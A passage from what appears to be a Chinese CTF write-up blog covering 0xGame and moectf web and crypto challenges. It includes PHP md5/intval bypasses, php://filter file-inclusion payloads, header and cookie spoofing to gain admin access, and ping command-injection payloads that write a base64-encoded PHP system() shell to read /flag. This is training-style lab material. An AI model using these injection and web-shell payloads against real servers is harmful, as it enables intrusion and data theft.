class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// flag in flag.php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-variable">$c</span> != <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$c</span>) == <span class="hljs-number">1024</span>) &#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$name</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-built_in">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-built_in">md5</span>(<span class="hljs-variable">$b</span>))<br></code></pre></td></tr></table></figure><p>用数组绕过即可</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if (!is_numeric($c) <span class="hljs-symbol">&amp;&amp;</span> $c != <span class="hljs-number">1024</span> <span class="hljs-symbol">&amp;&amp;</span> intval($c) == <span class="hljs-number">1024</span>)<br></code></pre></td></tr></table></figure><p>is_numeric有3种绕过方法，经过测试，数组绕过与%20%00都不可通过后面的intval<br>在1024后加入字母即可<br>intval为化整函数，使我们的payload加上个小数即可<br>include读取文件需要用到伪协议<br>cookie使用伪协议<br>payload:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">GET:</span><br>?a[]=<span class="hljs-number">1</span><span class="hljs-variable">&amp;b</span>[]=<span class="hljs-number">2</span><br><span class="hljs-symbol">POST:</span><br>c=<span class="hljs-number">1024.123</span>a<br><span class="hljs-symbol">COOKIE:</span><br><span class="hljs-attr">name</span><span class="hljs-operator">=</span>php:<span class="hljs-comment">//filter/convert.base64-encode/resource=flag</span><br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">PD<span class="hljs-number">9</span>waHAKCiRmbGF<span class="hljs-symbol">nID0</span>gJzB<span class="hljs-number">4</span>R<span class="hljs-number">2</span>FtZXs<span class="hljs-number">0</span><span class="hljs-name">M2</span>Ji<span class="hljs-name">M2</span>Uy<span class="hljs-symbol">NC0</span>wODI<span class="hljs-number">0</span>LTQ<span class="hljs-number">4</span>Y<span class="hljs-number">2</span>ItOTVkMC<span class="hljs-number">1</span>j<span class="hljs-symbol">NDcxNTQwYzA5</span><span class="hljs-symbol">NTN9</span>JzsKCj<span class="hljs-number">8</span>+<br></code></pre></td></tr></table></figure><p>拿到的字符base64解码即可<br>flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0xGame</span>&#123;<span class="hljs-number">43</span>bb3e24-<span class="hljs-number">0824</span>-<span class="hljs-number">48</span>cb-<span class="hljs-number">95</span>d0-c471540c0953&#125;<br></code></pre></td></tr></table></figure><h2 id="web–hello-http"><a href="#web–hello-http" class="headerlink" title="web–hello http"></a>web–hello http</h2><p>Error: The GET parameter query must be ctf<br>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GET:<br>?<span class="hljs-attribute">query</span>=ctf<br></code></pre></td></tr></table></figure><p>Error: The POST form action must be getflag<br>payload:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">POST:</span><br>action=getflag<br></code></pre></td></tr></table></figure><p>Error: Your are not admin<br>payload:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">cookie:</span><br>role=admin<br></code></pre></td></tr></table></figure><p>Error: Only allow local IP<br>抓个包叭<br>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-forwarded-for: <span class="hljs-number">127.0.0.1</span><br><br></code></pre></td></tr></table></figure><p>Error: You are not using HarmonyOS Browser 😡<br>payload:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">User</span>-Agent: HarmonyOS Browser<br></code></pre></td></tr></table></figure><p>Error: Only allow access from ys.mihoyo.com 😋<br>payload:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Referer:</span> ys.mihoyo.com<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0xGame</span>&#123;<span class="hljs-number">2</span>c1a10fb-<span class="hljs-number">921</span>e-<span class="hljs-number">4250</span>-<span class="hljs-number">820</span>f-<span class="hljs-number">5</span>ce36940b8b5&#125;<br></code></pre></td></tr></table></figure><h2 id="web–ping"><a href="#web–ping" class="headerlink" title="web–ping"></a>web–ping</h2><p>本题有前端拦截，需要burpsuite抓包<br><code>127.0.0.1；ls</code>，<code>;</code>被过滤了,<code>;</code>可用%0a替代，本题用<code>|</code><br>payload:</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>|ls<br>//api.php index.html simple.css<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>|cat api.php<br></code></pre></td></tr></table></figure><p>没有回显，可能cat空格或php被禁了<br>先考虑空格被禁<br>用%20代替，还是没有<br>用tab%09代替<br>可以回显<br>api.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitize</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$s</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No IP Address&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">sanitize</span>(<span class="hljs-variable">$ip</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#x27;</span>, <span class="hljs-variable">$ip</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid IP Address&#x27;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ping -c 4 &#x27;</span>.<span class="hljs-variable">$ip</span>. <span class="hljs-string">&#x27; 2&gt;&amp;1&#x27;</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>果然;’ ‘&#x2F;都被禁了<br>没有&#x2F;就不能查看上级目录<br>但我们可以<strong>写文件</strong><br>因;和flag被禁，我们用base64编码<br>system(‘ls’)<br>payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>=<span class="hljs-number">127.0.0.1</span>|echo%<span class="hljs-number">09</span><span class="hljs-string">&quot;PD9waHAgc3lzdGVtKCdscycpOw==&quot;</span>|base64%<span class="hljs-number">09</span>-d%<span class="hljs-number">09</span>&gt;<span class="hljs-number">2</span>.php<br></code></pre></td></tr></table></figure><p>system(‘ls &#x2F;‘)<br>payload:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">ip=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>|echo<span class="hljs-meta">%</span><span class="hljs-number">09</span><span class="hljs-string">&quot;PD9waHAgc3lzdGVtKCdscyAvJyk7&quot;</span>|base<span class="hljs-number">64</span><span class="hljs-meta">%</span><span class="hljs-number">09</span>-d<span class="hljs-meta">%</span><span class="hljs-number">09</span>&gt;<span class="hljs-number">2.</span>php<br><span class="hljs-comment">//bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var </span><br></code></pre></td></tr></table></figure><p>system(‘cat &#x2F;flag’)<br>payload:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">ip=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>|echo<span class="hljs-meta">%</span><span class="hljs-number">09</span><span class="hljs-string">&quot;PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs=&quot;</span>|base<span class="hljs-number">64</span><span class="hljs-meta">%</span><span class="hljs-number">09</span>-d<span class="hljs-meta">%</span><span class="hljs-number">09</span>&gt;<span class="hljs-number">2.</span>php<br><span class="hljs-comment">//0xGame&#123;19c71976-d7d8-4ab8-9ea5-6ea3800f59f6&#125; </span><br></code></pre></td></tr></table></figure><p><strong>方法二</strong><br>手动切换目录读取flag<br>payload:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gcode">ip=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>acd<span class="hljs-meta">%</span><span class="hljs-number">09.</span>.<span class="hljs-meta">%</span><span class="hljs-number">0</span>als<br><span class="hljs-comment">//html</span><br><br>ip=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>acd<span class="hljs-meta">%</span><span class="hljs-number">09.</span>.<span class="hljs-meta">%</span><span class="hljs-number">0</span>acd<span class="hljs-meta">%</span><span class="hljs-number">09.</span>.<span class="hljs-meta">%</span><span class="hljs-number">0</span>als<br><span class="hljs-comment">//backups cache lib local lock log mail opt run spool tmp www</span><br><br>ip=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>acd<span class="hljs-meta">%</span><span class="hljs-number">09.</span>.<span class="hljs-meta">%</span><span class="hljs-number">0</span>acd<span class="hljs-meta">%</span><span class="hljs-number">09.</span>.<span class="hljs-meta">%</span><span class="hljs-number">0</span>acd<span class="hljs-meta">%</span><span class="hljs-number">09.</span>.<span class="hljs-meta">%</span><span class="hljs-number">0</span>als<br><span class="hljs-comment">//bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br><br>ip=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>acd<span class="hljs-meta">%</span><span class="hljs-number">09.</span>.<span class="hljs-meta">%</span><span class="hljs-number">0</span>acd<span class="hljs-meta">%</span><span class="hljs-number">09.</span>.<span class="hljs-meta">%</span><span class="hljs-number">0</span>acd<span class="hljs-meta">%</span><span class="hljs-number">09.</span>.<span class="hljs-meta">%</span><span class="hljs-number">0</span>acat<span class="hljs-meta">%</span><span class="hljs-number">09</span>f*  <span class="hljs-comment">//flag被禁用用f*代替</span><br><span class="hljs-comment">//0xGame&#123;19c71976-d7d8-4ab8-9ea5-6ea3800f59f6&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web–ropo-leak"><a href="#web–ropo-leak" class="headerlink" title="web–ropo_leak"></a>web–ropo_leak</h2><p>Notice告诉我们：There is noting here. Using Git for version control<br>说明这是git泄露，这里用到一个工具Git_Extract：<a href="https://github.com/gakki429/Git_Extract">https://github.com/gakki429/Git_Extract</a><br>需要电脑有python2环境<br>因为我的电脑是python3，所以用liunx打开</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python git_extract.py http:<span class="hljs-regexp">//</span><span class="hljs-number">124.71</span>.<span class="hljs-number">184.68</span>:<span class="hljs-number">50013</span><span class="hljs-regexp">/.git/</span><br></code></pre></td></tr></table></figure><p>生成了一个新的文件<br><img src="/images/MSYOVUP75M42UT5DD3.png"><br>flag在posts&#x2F;flag&#x2F;index.html中<br><img src="/images/IGLQ0CNEZWTUFTIVZS5.png"></p><p>使用Git_hack搜不出flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>moectf</title>
    <link href="/2023/10/11/moectf/"/>
    <url>/2023/10/11/moectf/</url>
    
    <content type="html"><![CDATA[<h2 id="CLassical-Crypto-–-ezrot"><a href="#CLassical-Crypto-–-ezrot" class="headerlink" title="CLassical Crypto – ezrot"></a>CLassical Crypto – ezrot</h2><p>得到一个密文</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&gt;<span class="hljs-variable">@64E</span>7LC<span class="hljs-variable">@Ecf0</span><span class="hljs-symbol">:D0</span>;<span class="hljs-variable constant_">FDE020D</span><span class="hljs-symbol">:&gt;</span>!=<span class="hljs-number">60</span>=6<span class="hljs-symbol">EE6C0DF3DE:</span><span class="hljs-variable constant_">EFE</span><span class="hljs-symbol">:</span>@<span class="hljs-string">?0</span>4<span class="hljs-symbol">:</span>!96C0tsAJdEA6d;F&#125;%0N<br></code></pre></td></tr></table></figure><p>经过查询得知使用的是ROT5&#x2F;13&#x2F;18&#x2F;47加密，使用ROT47方法解密即可得到flag<br>flag</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">moectf&#123;rot47_is_just_<span class="hljs-built_in">a_simPle</span>_letter_substitution_ciPher_EDpy5tpe5juNT_&#125;<br></code></pre></td></tr></table></figure><h2 id="web–http"><a href="#web–http" class="headerlink" title="web–http"></a>web–http</h2><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">this <span class="hljs-keyword">is</span> GET <span class="hljs-keyword">method</span>,<br><span class="hljs-title function_">your</span> <span class="hljs-title function_">mission</span>:<br><br><span class="hljs-number">1</span>.use parameter: UwU=u<br><span class="hljs-number">2</span>.post **form**: Luv=u<br><span class="hljs-number">3</span>.use admin character<br><span class="hljs-number">4</span>.request <span class="hljs-keyword">from</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-number">5</span>.use browser <span class="hljs-string">&#x27;MoeBrowser&#x27;</span><br>Complete All Missions<br></code></pre></td></tr></table></figure><p>进入环境之后给了我们这些任务，完成即可<br>第一个<br>GET:?UwU&#x3D;u<br>第二个<br>POST:<br>Luv&#x3D;u<br>第三个<br>burp抓包把cookie里的character&#x3D;guest改为admin<br>第四个<br>继续抓包，在下面空行里加一个X-forwarded-for: 127.0.0.1<br><strong>注：X-forwarded-for: 127.0.0.1要插到前面，插到后面的话会加载不出来，不到什么原理🥶</strong><br>第五个<br>修改UA头换成MoeBrowser即可<br>Brilliant! Now I give you my flag: moectf{basic_http_knowledge_S0y4sE6ZlBM9RDemgwzNI0BOR4E4CJ7U}</p><h2 id="web–web入门指北"><a href="#web–web入门指北" class="headerlink" title="web–web入门指北"></a>web–web入门指北</h2><p>下载一个zip文件<br>打开是个pdf，其他的不用管，直接翻到最下面</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">666</span><span class="hljs-keyword">c</span><span class="hljs-number">61673</span>d<span class="hljs-number">6257396</span><span class="hljs-keyword">c</span><span class="hljs-number">5933526</span>d<span class="hljs-number">6533637</span>a<span class="hljs-number">62454e7662575666564739666257396</span><span class="hljs-keyword">c</span><span class="hljs-number">513152475831637959</span><br><span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-number">396</span>a<span class="hljs-number">61474673624756755</span>a<span class="hljs-number">3055684958303</span>d<br></code></pre></td></tr></table></figure><p>这样一番代码<br>先字符解码，获得如下</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">flag</span><span class="hljs-operator">=</span>bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0<span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>试一下最常用的base64</p><p>获取<br><code>moectf&#123;w3lCome_To_moeCTF_W2b_challengE!!&#125;</code></p><h2 id="web–彼岸的flag"><a href="#web–彼岸的flag" class="headerlink" title="web–彼岸的flag"></a>web–彼岸的flag</h2><p>hint说粗心的出题人在这个聊天平台不小心泄露了自己的flag<br>然后搜了半天cms识别和ico文件<br>结果没想到flag竟然藏在了源码里。。。</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">经过tracker，破获出内容为moectf</span><span class="hljs-template-variable">&#123;find_comments_xlOHEvYhaGNpeEdzZmoT5gIb4CS3ZPmY&#125;</span><br></code></pre></td></tr></table></figure><p>竟然是撤回的消息</p><h2 id="web–cookie"><a href="#web–cookie" class="headerlink" title="web–cookie"></a>web–cookie</h2><p>压缩包内容如下</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">## 一些api说明<br><br>注册 `POST /register`<br>json<br>&#123;<br>    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;koito&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span><br>&#125;<br><br><br>登录 `POST /login`<br>json<br>&#123;<br>    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;koito&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span><br>&#125;<br><br><br>获取flag `GET /flag`<br><br>查询服务状态 `GET /status`<br></code></pre></td></tr></table></figure><p>先登录&#x2F;register<br>注册一下<br>hint说了readme只是一个样例，不是拿来复制的<br>我们把参数改一改<br>POST提交</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;zijie&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123456&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>error与data都是ok，没问题<br>然后&#x2F;login再重复操作<br>如果使用的是burp抓包，建议进入&#x2F;flag后检查一下是POST还是GET，README给我们的是GET,那么我们使用GET，进入flag后页面提示{“error”: “ok”, “data”: {“flag”: “flag{sorry_but_you_are_not_admin}”}}<br>这里我们改一下cookie里的token，如果抓到了character&#x3D;guest;需要把guest也改为admin<br>token使用base64编码，解码后为</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;zijie&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;123456&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;role&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;user&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>将user改为admin后重新base64编码放回token<br>成功获取flag</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ok&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;flag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;moectf&#123;cooKi3_is_d3licious_MA9iVff90SSJ!!M6Mrfu9ifxi9i!JGofMJ36D9cPMxro&#125;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Classical-Crypto-–皇帝的新密码"><a href="#Classical-Crypto-–皇帝的新密码" class="headerlink" title="Classical Crypto –皇帝的新密码"></a>Classical Crypto –皇帝的新密码</h2><p>打开压缩包得到一个密文</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">tvljam</span><span class="hljs-template-variable">&#123;JhLzhL_JPwoLy_Pz_h_cLyF_zPtwPL_JPwoLy!_ZmUVUA40q5KbEQZAK5Ehag4Av&#125;</span><br></code></pre></td></tr></table></figure><p>发现这是凯撒密码，发现一个新的解密网站，它可以把结果都列出来<br><a href="https://tool.bugku.com/jiemi/">传送门</a></p><p>找到moectf的flag模板</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">moectf&#123;CaEsaE_CIphEr_Is_<span class="hljs-built_in">a_vErY</span>_sImpIE_CIphEr!_SfNONT40j5DuXJSTD5Xatz4To&#125;<br></code></pre></td></tr></table></figure><h2 id="web–moe图床"><a href="#web–moe图床" class="headerlink" title="web–moe图床"></a>web–moe图床</h2><p>文件上传题，url输入&#x2F;upload.php可以查看源码，或者可以burpsuite抓包修改上传文件的name参数后页面会回显源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$targetDir</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span>;<br><span class="hljs-variable">$allowedExtensions</span> = [<span class="hljs-string">&#x27;png&#x27;</span>];<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$tmp_path</span> = <span 